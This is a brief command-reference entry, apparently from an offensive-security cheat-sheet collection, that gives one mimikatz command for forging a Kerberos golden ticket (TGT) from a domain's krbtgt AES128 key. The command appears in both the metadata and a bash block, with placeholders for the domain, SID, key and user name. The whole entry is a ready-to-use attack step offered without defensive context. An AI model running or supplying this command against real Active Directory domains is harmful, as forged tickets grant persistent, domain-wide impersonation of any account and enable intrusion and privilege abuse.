---
id: 221abfbf-27c8-4a8b-baed-ad3d2935f257
name: to generate the TGT with AES 128 key
type: command
executor: bash
data: 'mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key>
  /user:<user_name>

  '
output: null
created_at: '2020-07-14T18:14:44.043584+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# to generate the TGT with AES 128 key

```bash
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name>

```
